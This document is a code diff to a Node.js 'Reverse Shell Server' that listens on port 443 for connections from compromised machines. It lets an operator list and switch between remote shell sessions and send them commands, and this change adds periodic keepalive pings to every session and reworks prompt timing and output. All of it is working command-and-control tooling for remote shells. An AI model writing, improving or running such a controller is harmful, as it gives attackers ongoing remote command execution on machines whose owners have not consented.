@@ -1,5 +1,6 @@
 const moduleNet = require("net");
 const moduleReadLine = require("readline");
+const moduleStdout = require("stdout-stream");
 
 /**
  * TODO:
@@ -33,17 +34,30 @@ class ShellServer {
     // number of session to which commands from input line will be send
     this.activeSession = 0;
 
+    // last reception time
+    this.lastReceptionTime = Date.now();
+
     this.server.on("connection", socket => this.onNewConnection(socket));
     this.readLine.on("line", line => this.onReadLine.call(this, line));
 
     this.server.listen(port);
-    writeln(FgWhite + "Reverse Shell Server v1.2 - listening on port:" + port);
+    writeln(FgWhite + "Reverse Shell Server v1.3 - listening on port:" + port);
     writeln(
       "CmdLine - enter:\n@ - to list all connected sessions\n@n - to switch to session number\n@exit - to exit\n"
     );
-    this.printInputReady();
+    setInterval(this.sendPing.bind(this), 2000);
+    setInterval(this.printInputReady.bind(this), 100);
   }
 
+  /**
+   *
+   * function sending pings to all connected clients
+   */
+  sendPing() {
+    Object.keys(this.sessionsDict).forEach(key => {
+      this.sessionsDict[key].write("@ping@\n");
+    });
+  }
   /**
    *
    * @param {Socket} socket
@@ -68,7 +82,13 @@ class ShellServer {
    *  Prints input ready mark containing active session id.
    */
   printInputReady() {
-    this.printSessionPrefix(FgBlue, this.activeSession);
+    if (
+      this.lastReceptionTime > 0 &&
+      Date.now() - this.lastReceptionTime > 300
+    ) {
+      this.printSessionPrefix(FgBlue, this.activeSession);
+      this.lastReceptionTime = 0;
+    }
   }
 
   /**
@@ -83,7 +103,6 @@ class ShellServer {
 
     // no active sessions -> not necessary to interpret session listing and switching commands
     if (this.activeSession == 0) {
-      this.printInputReady();
       return;
     }
 
@@ -108,7 +127,6 @@ class ShellServer {
       else if (tempId in this.sessionsDict) this.activeSession = tempId;
       else writeln("No session number:" + tempId + " exists");
     }
-    this.printInputReady();
   }
 
   /**
@@ -130,9 +148,9 @@ class ShellServer {
   processReceivedLine(sessionId, prefix, content) {
     if (prefix === "cmd") {
       this.printSessionPrefix(FgYellow, sessionId);
-      process.stdout.write(prefix + "---" + content + "\n");
+      moduleStdout.write(prefix + "---" + content + "\n");
     } else {
-      process.stdout.write("unknown client response:" + prefix);
+      moduleStdout.write("unknown client response:" + prefix);
     }
   }
 
@@ -144,6 +162,7 @@ class ShellServer {
   onReceivedData(sessionId, data) {
     const lines = data.toString().split("\n");
     for (let index = 0; index < lines.length; index++) {
+      this.lastReceptionTime = Date.now();
       // get line prefix
       // lines contains '\r' char inside - caret return, which might cause side effects
 
@@ -152,10 +171,8 @@ class ShellServer {
       const endOfPrefix = completeLine.substr(1).indexOf("@");
       const currentLinePrefix = completeLine.substr(1, endOfPrefix);
       const currentLine = completeLine.substr(endOfPrefix + 2);
-
       this.processReceivedLine(sessionId, currentLinePrefix, currentLine);
     }
-    this.printInputReady();
   }
 
   /**
@@ -175,10 +192,9 @@ class ShellServer {
    */
   onConnectionClosed(sessionId) {
     this.printSessionPrefix(FgRed, sessionId);
-    process.stdout.write("session disconnected\n");
+    moduleStdout.write("session disconnected\n");
     delete this.sessionsDict[sessionId];
     this.activeSession = this.findNextSession(sessionId);
-    this.printInputReady();
   }
   /**
    *
@@ -214,7 +230,7 @@ const FgWhite = "\x1b[37m";
  * @param {string} msg
  */
 function write(msg) {
-  process.stdout.write(msg);
+  moduleStdout.write(msg);
 }
 
 /**
@@ -222,7 +238,8 @@ function write(msg) {
  * @param {string} msg
  */
 function writeln(msg) {
-  process.stdout.write(msg + "\n");
+  if (!msg) msg = "";
+  moduleStdout.write(msg + "\n");
 }
 
 const port = 443;
